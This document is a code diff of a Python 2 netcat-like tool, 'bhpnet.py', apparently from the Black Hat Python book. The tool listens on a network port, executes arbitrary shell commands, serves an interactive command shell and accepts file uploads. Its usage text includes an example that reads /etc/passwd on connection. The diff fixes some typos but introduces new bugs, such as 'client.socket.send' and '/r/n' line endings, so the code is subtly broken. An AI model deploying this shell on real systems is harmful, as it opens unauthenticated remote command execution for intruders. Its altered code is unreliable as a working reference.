@@ -1,17 +1,18 @@
-#!/usr/bin/python
+#!/usr/bin/python2.7
+
 import sys
 import socket
 import getopt
 import threading
 import subprocess
 
-listen             = False
-command            = False
-upload             = False
-execute            = ""
-target             = ""
+listen = False
+command = False
+upload = False
+execute = ""
+target = ""
 upload_destination = ""
-port               = 0
+port = 0
 
 #provide usage instructions
 def usage():
@@ -19,25 +20,24 @@ def usage():
     print
     print "Usage: bhpnet.py -t target_host -p port"
     print "-l --listen - listen on [host]:[port] for incoming connections"
-    print "-e --execute=file_to_run - execute the given file upon reciving a connection"
+    print "-e --execute=file_to_run - execute the given file upon receiving a connection"
     print "-c --command - init command shell"
-    print "-u --upload==destination - upload and write to a file to [destination] upon a connection"
+    print "-u --upload=destination - upload and write to a file to [destination] upon a connection"
     print
     print
     print "Examples: "
     print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
-    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
+    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=C:\\target.exe"
     print "bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
     print "echo 'ABCDEFGH' | ./bhpnet.py -t 192.168.11.12 -p 135"
     sys.exit(0)
 
 def client_sender(buffer):
-    
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
+
     try:
         #connect to target host
-        client.connect((target, port))
+        client.connect((target,port))
         
         if len(buffer):
             client.send(buffer)
@@ -47,10 +47,9 @@ def client_sender(buffer):
             #wait for data back
             recv_len = 1
             response = ""
-            
+
             while recv_len:
-                
-                data     = client.recv(4096)
+                data = client.recv(4096)
                 recv_len = len(data)
                 response += data
                 
@@ -67,18 +66,18 @@ def client_sender(buffer):
             client.send(buffer)
             
     except:
-        
         print "[*] Exception. Exiting"
         
         client.close()
         
 def server_loop():
     global target
+    global port
     
     #if no target, listen on all interfaces
     if not len(target):
         target = "0.0.0.0"
-        
+
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.bind((target, port))
     
@@ -97,7 +96,7 @@ def run_command(command):
     
     #run the command and get the output back
     try:
-        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
     except:
         output = "Failed to execute the command. \r\n"
         
@@ -115,7 +114,7 @@ def client_handler(client_socket):
         #read the bytes to werite to the destination    
         file_buffer = ""
         
-        #keep reading data until none is avaliable
+        #keep reading data until none is available
         while True:
             data = client_socket.recv(1024)
             
@@ -125,30 +124,30 @@ def client_handler(client_socket):
                 file_buffer += data
                 
         #now write out bytes
-            try:
-                file_descriptor = open(upload_destination, "wb")
-                file_descriptor.write(file_buffer)
-                file_desciptor.close()
+        try:
+            file_descriptor = open(upload_destination,"wb")
+            file_descriptor.write(file_buffer)
+            file_descriptor.close()
                 
-                #acknowledge write-out
-                client_socket.send("Successfully saved the file to %s\r\n" % upload_destination)
-            except:
-                client_socket.send("Failed to save the file to %s\r\n" % upload_destination)
-    
+            #acknowledge write-out
+            client_socket.send("Successfully saved the file to %s/r/n" % upload_destination)
+        except:
+            client_socket.send("Failed to save the file to %s/r/n" % upload_destination)
+
     #check cmd execution    
     if len(execute):
         
         #run the command
         output = run_command(execute)
         
-        client_socket.send(output)
+        client.socket.send(output)
         
     #command shell loop
     if command:
         
         while True:
             #show a simple prompt
-            client_socket.send("<BHP:#>")
+            client_socket.send("<BHP:#> ")
             
             #receive until line feed
             cmd_buffer = ""
@@ -159,7 +158,7 @@ def client_handler(client_socket):
             response = run_command(cmd_buffer)
             
             #send back the response
-            client_socket.send(respose)
+            client_socket.send(response)
             
 def main():
     global listen
@@ -172,7 +171,7 @@ def main():
     #catch empty input
     if not len(sys.argv[1:]):
         usage()
-    
+
     #read commands
     try:
         opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"])
@@ -203,7 +202,7 @@ def main():
         if not listen and len(target) and port > 0:
             #read buffer from cmd line
             #CTRL+D to bypass stdin read if no data
-            buff = sys.stdin.read()
+            buffer = sys.stdin.read()
             
             client_sender(buffer)
             
@@ -211,6 +210,5 @@ def main():
             #wait for commands
             print ("server running...")
             server_loop()
-            print ("server stopped")
             
 main()
